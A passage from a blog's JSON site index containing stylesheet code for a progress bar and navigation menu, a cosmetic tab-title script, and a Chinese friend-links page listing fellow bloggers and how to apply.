.pace-progress[data-progress-text=\"50%\"]:after { right: -107px } .pace .pace-progress[data-progress-text=\"51%\"]:after { right: -105.14px } .pace .pace-progress[data-progress-text=\"52%\"]:after { right: -103.28px } .pace .pace-progress[data-progress-text=\"53%\"]:after { right: -101.42px } .pace .pace-progress[data-progress-text=\"54%\"]:after { right: -99.56px } .pace .pace-progress[data-progress-text=\"55%\"]:after { right: -97.7px } .pace .pace-progress[data-progress-text=\"56%\"]:after { right: -95.84px } .pace .pace-progress[data-progress-text=\"57%\"]:after { right: -93.98px } .pace .pace-progress[data-progress-text=\"58%\"]:after { right: -92.12px } .pace .pace-progress[data-progress-text=\"59%\"]:after { right: -90.26px } .pace .pace-progress[data-progress-text=\"60%\"]:after { right: -88.4px } .pace .pace-progress[data-progress-text=\"61%\"]:after { right: -86.53999999999999px } .pace .pace-progress[data-progress-text=\"62%\"]:after { right: -84.68px } .pace .pace-progress[data-progress-text=\"63%\"]:after { right: -82.82px } .pace .pace-progress[data-progress-text=\"64%\"]:after { right: -80.96000000000001px } .pace .pace-progress[data-progress-text=\"65%\"]:after { right: -79.1px } .pace .pace-progress[data-progress-text=\"66%\"]:after { right: -77.24px } .pace .pace-progress[data-progress-text=\"67%\"]:after { right: -75.38px } .pace .pace-progress[data-progress-text=\"68%\"]:after { right: -73.52px } .pace .pace-progress[data-progress-text=\"69%\"]:after { right: -71.66px } .pace .pace-progress[data-progress-text=\"70%\"]:after { right: -69.8px } .pace .pace-progress[data-progress-text=\"71%\"]:after { right: -67.94px } .pace .pace-progress[data-progress-text=\"72%\"]:after { right: -66.08px } .pace .pace-progress[data-progress-text=\"73%\"]:after { right: -64.22px } .pace .pace-progress[data-progress-text=\"74%\"]:after { right: -62.36px } .pace .pace-progress[data-progress-text=\"75%\"]:after { right: -60.5px } .pace .pace-progress[data-progress-text=\"76%\"]:after { right: -58.64px } .pace .pace-progress[data-progress-text=\"77%\"]:after { right: -56.78px } .pace .pace-progress[data-progress-text=\"78%\"]:after { right: -54.92px } .pace .pace-progress[data-progress-text=\"79%\"]:after { right: -53.06px } .pace .pace-progress[data-progress-text=\"80%\"]:after { right: -51.2px } .pace .pace-progress[data-progress-text=\"81%\"]:after { right: -49.34px } .pace .pace-progress[data-progress-text=\"82%\"]:after { right: -47.480000000000004px } .pace .pace-progress[data-progress-text=\"83%\"]:after { right: -45.62px } .pace .pace-progress[data-progress-text=\"84%\"]:after { right: -43.76px } .pace .pace-progress[data-progress-text=\"85%\"]:after { right: -41.9px } .pace .pace-progress[data-progress-text=\"86%\"]:after { right: -40.04px } .pace .pace-progress[data-progress-text=\"87%\"]:after { right: -38.18px } .pace .pace-progress[data-progress-text=\"88%\"]:after { right: -36.32px } .pace .pace-progress[data-progress-text=\"89%\"]:after { right: -34.46px } .pace .pace-progress[data-progress-text=\"90%\"]:after { right: -32.6px } .pace .pace-progress[data-progress-text=\"91%\"]:after { right: -30.740000000000002px } .pace .pace-progress[data-progress-text=\"92%\"]:after { right: -28.880000000000003px } .pace .pace-progress[data-progress-text=\"93%\"]:after { right: -27.02px } .pace .pace-progress[data-progress-text=\"94%\"]:after { right: -25.16px } .pace .pace-progress[data-progress-text=\"95%\"]:after { right: -23.3px } .pace .pace-progress[data-progress-text=\"96%\"]:after { right: -21.439999999999998px } .pace .pace-progress[data-progress-text=\"97%\"]:after { right: -19.58px } .pace .pace-progress[data-progress-text=\"98%\"]:after { right: -17.72px } .pace .pace-progress[data-progress-text=\"99%\"]:after { right: -15.86px } .pace .pace-progress[data-progress-text=\"100%\"]:after { right: -14px } .pace .pace-activity { position: absolute; width: 100%; height: 28px; z-index: 2001; box-shadow: inset 0 0 0 2px #29d, inset 0 0 0 7px #FFF; border-radius: 10px; } .pace.pace-inactive { display: none; }"},{"path":"/js/title.js","content":"//动态标题 var OriginTitile = document.title; var titleTime; document.addEventListener('visibilitychange', function () { if (document.hidden) { //离开当前页面时标签显示内容 document.title = '👀跑哪里去了~'; clearTimeout(titleTime); } else { //返回当前页面时标签显示内容 document.title = '🐖抓到你啦～'; //两秒后变回正常标题 titleTime = setTimeout(function () { document.title = OriginTitile; }, 2000); } });"},{"path":"/css/custom.css","content":"/* 文章页H1-H6图标样式效果 */ h1::before, h2::before, h3::before, h4::before, h5::before, h6::before { -webkit-animation: ccc 1.6s linear infinite ; animation: ccc 1.6s linear infinite ; } @-webkit-keyframes ccc { 0% { -webkit-transform: rotate(0deg); transform: rotate(0deg) } to { -webkit-transform: rotate(-1turn); transform: rotate(-1turn) } } @keyframes ccc { 0% { -webkit-transform: rotate(0deg); transform: rotate(0deg) } to { -webkit-transform: rotate(-1turn); transform: rotate(-1turn) } }"},{"path":"/css/nav_menu.css","content":"/* 颜色 */ :root { --g0ubu1i-theme-op: #050505; --g0ubu1i-white: #fff; --g0ubu1i-black: #000; --g0ubu1i-none: rgba(0, 0, 0, 0); --g0ubu1i-gray: #999999; --g0ubu1i-yellow: #ffc93e; --g0ubu1i-border-radius: 8px; --g0ubu1i-main: var(--g0ubu1i-theme); --g0ubu1i-main-op: var(--g0ubu1i-theme-op); --g0ubu1i-shadow-theme: 0 8px 12px -3px var(--g0ubu1i-theme-op); --g0ubu1i-shadow-main: 0 8px 12px -3px var(--g0ubu1i-main-op); --g0ubu1i-shadow-blue: 0 8px 12px -3px rgba(40, 109, 234, 0.2); --g0ubu1i-shadow-white: 0 8px 12px -3px rgba(255, 255, 255, 0.2); --g0ubu1i-shadow-black: 0 0 12px 4px rgba(0, 0, 0, 0.05); --g0ubu1i-shadow-yellow: 0px 38px 77px -26px rgba(255, 201, 62, 0.12); --g0ubu1i-shadow-red: 0 8px 12px -3px #ee7d7936; --g0ubu1i-shadow-green: 0 8px 12px -3px #87ee7936; --g0ubu1i-shadow-border: 0 8px 16px -4px #2c2d300c; --g0ubu1i-logo-color: linear-gradient(215deg, #4584ff 30%, #ff7676 70%); --style-border: 1px solid var(--g0ubu1i-card-border); --g0ubu1i-blue-main: #3b70fc; --style-border-hover: 1px solid var(--g0ubu1i-main); --style-border-dashed: 1px dashed var(--g0ubu1i-theme-op); --style-border-avatar: 4px solid var(--g0ubu1i-background); --style-border-always: 1px solid var(--g0ubu1i-card-border); --g0ubu1i-white-acrylic1: #fefeff !important; --g0ubu1i-white-acrylic2: #fcfdff !important; --g0ubu1i-black-acrylic2: #08080a !important; --g0ubu1i-black-acrylic1: #0b0b0e !important; } [data-theme=\"light\"] { --g0ubu1i-theme: #3b70fc; --g0ubu1i-theme-op: #4259ef23; --g0ubu1i-blue: #3b70fc; --g0ubu1i-red: #d8213c; --g0ubu1i-pink: #ff7c7c; --g0ubu1i-green: #57bd6a; --g0ubu1i-fontcolor: #363636; --g0ubu1i-background: #f7f9fe; --g0ubu1i-reverse: #000; --g0ubu1i-maskbg: rgba(255, 255, 255, 0.6); --g0ubu1i-maskbgdeep: rgba(255, 255, 255, 0.85); --g0ubu1i-hovertext: var(--g0ubu1i-theme); --g0ubu1i-ahoverbg: #f7f7fa; --g0ubu1i-lighttext: var(--g0ubu1i-main); --g0ubu1i-secondtext: rgba(60, 60, 67, 0.6); --g0ubu1i-scrollbar: rgba(60, 60, 67, 0.4); --g0ubu1i-card-btn-bg: #edf0f7; --g0ubu1i-post-blockquote-bg: #fafcff; --g0ubu1i-post-tabs-bg: #f2f5f8; --g0ubu1i-secondbg: #edf0f7; --g0ubu1i-shadow-nav: 0 5px 12px -5px rgba(102, 68, 68, 0.05); --g0ubu1i-card-bg: #fff; --g0ubu1i-shadow-lightblack: 0 5px 12px -5px rgba(102, 68, 68, 0); --g0ubu1i-shadow-light2black: 0 5px 12px -5px rgba(102, 68, 68, 0); --g0ubu1i-card-border: #c0c6d8; } [data-theme=\"dark\"] { --g0ubu1i-theme: #0084ff; --g0ubu1i-theme-op: #0084ff23; --g0ubu1i-blue: #0084ff; --g0ubu1i-red: #ff3842; --g0ubu1i-pink: #ff7c7c; --g0ubu1i-green: #57bd6a; --g0ubu1i-fontcolor: #f7f7fa; --g0ubu1i-background: #18171d; --g0ubu1i-reverse: #fff; --g0ubu1i-maskbg: rgba(0, 0, 0, 0.6); --g0ubu1i-maskbgdeep: rgba(0, 0, 0, 0.85); --g0ubu1i-hovertext: #0a84ff; --g0ubu1i-ahoverbg: #fff; --g0ubu1i-lighttext: #f2b94b; --g0ubu1i-secondtext: #a1a2b8; --g0ubu1i-scrollbar: rgba(200, 200, 223, 0.4); --g0ubu1i-card-btn-bg: #30343f; --g0ubu1i-post-blockquote-bg: #000; --g0ubu1i-post-tabs-bg: #121212; --g0ubu1i-secondbg: #30343f; --g0ubu1i-shadow-nav: 0 5px 20px 0px rgba(28, 28, 28, 0.4); --g0ubu1i-card-bg: #1d1b26; --g0ubu1i-shadow-lightblack: 0 5px 12px -5px rgba(102, 68, 68, 0); --g0ubu1i-shadow-light2black: 0 5px 12px -5px rgba(102, 68, 68, 0); --g0ubu1i-card-border: #42444a; } #nav a:hover { background: var(--g0ubu1i-blue-main); transition: 0.3s; } #nav-totop:hover .totopbtn i { opacity: 1; } #nav-totop #percent { font-size: 12px; background: var(--g0ubu1i-white); color: var(--g0ubu1i-main); width: 25px; height: 25px; border-radius: 35px; display: flex; justify-content: center; align-items: center; transition: 0.3s; } .nav-fixed #nav-totop #percent, .page #nav-totop #percent { background: var(--g0ubu1i-white); color: var(--card-bg); font-size: 13px; } #nav-totop { width: 35px; } #page-header:not(.is-top-bar) #percent { transition: 0.3s; } #page-header:not(.is-top-bar) #nav-totop { width: 0; opacity: 0; transition: width 0.3s, opacity 0.2s; margin-left: 0 !important; } #nav-totop #percent { font-weight: 700; } #nav-totop:hover #percent { opacity: 0; transform: scale(1.5); font-weight: 700; } #page-header #nav #nav-right div { margin-left: 0.5rem; padding: 0; } #nav-totop { display: flex; align-items: center; justify-content: center; transition: 0.3s; } .nav-button { cursor: pointer; } div#menus { display: flex; align-items: center; } #page-header #nav .nav-button a { height: 35px; width: 35px; display: flex; align-items: center; justify-content: center; } #nav .site-page { padding-bottom: 0px; } #nav *::after { background-color: transparent !important; } /* 顶栏修改 */ #nav .menus_items .menus_item .menus_item_child li a { padding: 2px 16px; } #nav .menus_items .menus_item .menus_item_child li:hover a { color: white !important; } #nav .menus_items .menus_item .menus_item_child li { margin: 6px; border-radius: 5px; transition: all 0.3s; display: inline-block; margin: 0 3px; } #nav .menus_items .menus_item .menus_item_child:before { top: -19px; } #site-name, .shuoshuo { white-space: nowrap; overflow: hidden; } #site-name { padding: 0 8px; position: relative; display: flex; align-items: center; justify-content: center; transition: 0.3s; } #blog_name #site-name i { opacity: 0; position: absolute; } #blog_name #site-name:hover .title { opacity: 0; } #blog_name #site-name:hover i { opacity: 1; transform: scale(1.01); color: white; } /* 圆角隐藏 */ ul.menus_item_child { border-radius: 5px; } /* 一级菜单居中 */ #nav .menus_items { position: absolute; width: fit-content; left: 50%; transform: translateX(-50%); display: flex; flex-direction: row; justify-content: center; align-items: center; height: 60px; } #nav .menus_items .menus_item:hover .menus_item_child { display: block; transform: translateX(-50%); right: auto; left: auto !important; padding: 6px 4px; box-sizing: content-box; line-height: 35px; } #nav .menus_items .menus_item:hover { padding: 0 5px 27px 5px !important; margin-bottom: -14.5px !important; } #nav .menus_items .menus_item .menus_item_child { top: 44px; } @media screen and (min-width: 768px) { .page .menus_item:hover > a.site-page { color: var(--g0ubu1i-white) !important; background: var(--g0ubu1i-main); transition: 0.3s; box-shadow: var(--g0ubu1i-shadow-main); } } .nav-fixed #nav { transform: translateY(58px) !important; } #nav { padding: 0 calc((100% - 1420px) / 2); backdrop-filter: saturate(180%) blur(20px); } #nav a { border-radius: 8px; color: var(--font-color); } .page #nav a:hover { color: var(--g0ubu1i-white) !important; background: var(--g0ubu1i-main); transition: 0.3s; box-shadow: var(--g0ubu1i-shadow-main); } #menus > div.menus_items > div > a { letter-spacing: 0.3rem; font-weight: 700; padding: 0em 0.3em 0em 0.5em; height: 35px; line-height: 35px; } #nav .menus_items .menus_item { padding: 0 5px; display: flex; flex-direction: column; margin: auto; align-items: center; } #nav div#toggle-menu { padding: 2px 0 4px 6px; } #nav-totop .totopbtn i { position: absolute; display: flex; opacity: 0; } #page-name::before { font-size: 18px; position: absolute; width: 100%; height: 100%; border-radius: 8px; color: white !important; top: 0; left: 0; content: \"回到顶部\"; background-color: var(--g0ubu1i-theme); transition: all 0.3s; -webkit-transition: all 0.3s; -moz-transition: all 0.3s; -ms-transition: all 0.3s; -o-transition: all 0.3s; opacity: 0; box-shadow: 0 0 3px var(--g0ubu1i-theme); line-height: 45px; /*如果垂直位置不居中可以微调此值，也可以删了*/ } #page-name:hover:before { opacity: 1; } #name-container { transition: all 0.3s; -webkit-transition: all 0.3s; -moz-transition: all 0.3s; -ms-transition: all 0.3s; -o-transition: all 0.3s; } #name-container:hover { transform: translateX(-50%) scale(1.03); } #page-name { position: relative; padding: 10px 30px; -webkit-animation-timing-function: ease-out; } center#name-container { position: absolute; width: 100%; left: 50%; transform: translateX(-50%); font-family: \"ZhuZiAYuanJWD\"; } .nav-fixed.nav-visible #name-container { transition: 0.3s; transform: translate(-50%, 60px); } .nav-fixed.nav-visible #menus .menus_items { transform: translate(-50%); transition: 0.3s; line-height: 60px; } .nav-fixed #menus .menus_items { transform: translate(-50%, -60px); transition: 0.3s; } .nav-fixed #name-container { top: 15%; transition: 0.3s; } #name-container { bottom: 60px; } .mask-name-container { max-width: 1200px; width: 50%; height: 100%; position: absolute; overflow: hidden; left: 50%; transform: translateX(-50%); } @media screen and (max-width: 992px) { .mask-name-container { width: 65%; } } @media screen and (max-width: 768px) { .mask-name-container { display: none; } } #sidebar #sidebar-menus .menus_items .site-page:hover { color: var(--g0ubu1i-white); border-radius: var(--g0ubu1i-border-radius); } #nav .menus_items .menus_item > a > i:last-child { display: none; } #nav #search-button { font-size: 1.3em; } @media screen and (min-width: 900px) { #nav .back-home-button:hover { box-shadow: var(--g0ubu1i-shadow-main); } } .back-home-button:hover { background: var(--g0ubu1i-main); color: var(--g0ubu1i-white) !important; } .back-home-button { display: flex; width: 35px; height: 35px; padding: 0 !important; align-items: center; justify-content: center; margin-right: 4px; transition: 0.3s; border-radius: 8px; } .back-home-button:hover .back-menu-list-groups { display: flex; opacity: 1; transition: 0.3s; top: 55px; pointer-events: auto; left: 0; } .back-home-button .back-menu-list-groups { position: absolute; top: 65px; left: 0; background: var(--g0ubu1i-card-bg); border-radius: 12px; border: var(--style-border); flex-direction: column; font-size: 12px; color: var(--g0ubu1i-secondtext); box-shadow: var(--g0ubu1i-shadow-border); transition: 0s; opacity: 0; pointer-events: none; } .back-home-button .back-menu-list-group { display: flex; flex-direction: column; } .back-home-button .back-menu-list-group .back-menu-list-title { margin: 8px 0 0 16px; transition: 0.3s; } .back-home-button .back-menu-list { display: flex; flex-direction: column; } .back-home-button .back-menu-list::before { position: absolute; top: -22px; left: 0px; width: 100%; height: 25px; content: \"\"; } .back-home-button .back-menu-list-group:hover .back-menu-list-title { color: var(--g0ubu1i-main); } .back-home-button .back-menu-list-groups:hover { border: var(--style-border-hover); } .back-home-button .back-menu-list .back-menu-item { display: flex; align-items: center; margin: 4px 8px; padding: 4px 8px !important; transition: 0.3s; border-radius: 8px; } .back-home-button .back-menu-list .back-menu-item .back-menu-item-text { font-size: var(--global-font-size); margin-left: 0.5rem; color: var(--g0ubu1i-fontcolor); white-space: nowrap; } #nav #blog_name { flex-wrap: nowrap; height: 60px; display: flex; align-items: center; /* z-index: 102; */ transition: 0.3s; } .back-home-button .back-menu-list .back-menu-item .back-menu-item-icon { width: 24px; height: 24px; border-radius: 24px; background: var(--g0ubu1i-secondbg); } #page-header #nav .back-home-button { cursor: pointer; position: relative; } @media screen and (min-width: 1300px) { #nav a:hover { transform: scale(1.03); } } .back-home-button .back-menu-list .back-menu-item:hover .back-menu-item-text { color: var(--g0ubu1i-white); } .back-menu-item-icon.loading img { width: 25px; } #page-header #nav #menus .nav-button.long a.totopbtn, #page-header #nav #menus .nav-button.long, #page-header #nav #menus .nav-button.long a.totopbtn span { width: 70px; } #page-header #nav #menus .nav-button.long a.totopbtn span { border-radius: 35px; display: flex; justify-content: center; align-items: center; transition: 0.3s; white-space: nowrap; } #page-header #nav #menus .nav-button.long a.totopbtn:hover { border-radius: 35px; height: 30px; } #nav #search-button { padding-left: 0; } #page-header #nav .nav-button { margin-left: 0.5rem; padding: 0; } #page-header:not(.is-top-bar) #nav-totop a { display: none; } #search-button a.site-page.social-icon.search span { display: none; }"},{"title":"友情链接","path":"/friends/index.html","content":":root { --border: #00bcd4; --hover: #2196f3; --text: #2c3e50; } .friend-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1.5rem; margin-top: 2rem; } .friend-card { background: #ffffff; border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem; text-align: center; transition: all 0.3s ease; } .friend-card:hover { transform: scale(1.02); border-color: var(--hover); box-shadow: 0 0 12px rgba(0,188,212,0.2); } .friend-avatar { width: 72px; height: 72px; border-radius: 50%; object-fit: cover; margin-bottom: 0.8rem; border: 2px solid var(--border); } .friend-name { font-weight: bold; font-size: 1.05rem; margin: 0.4rem 0; color: var(--text); } .friend-descr { font-size: 0.85rem; color: #666; } 友情链接 欢迎交换友链，请留言或通过邮箱联系我。 Monoceros406 逆向大佬 Daaihang Wong Daaihang学长 fault web高手 ph0m linux大佬 云间 linux大佬 ly1-boop 密码佬 申请友链 📮 联系邮箱：goubulibald@gmail.com 请提供以下内容： 1234- name: 博客名称 link: 博客地址 avatar: 头像链接 descr: 简要介绍"}]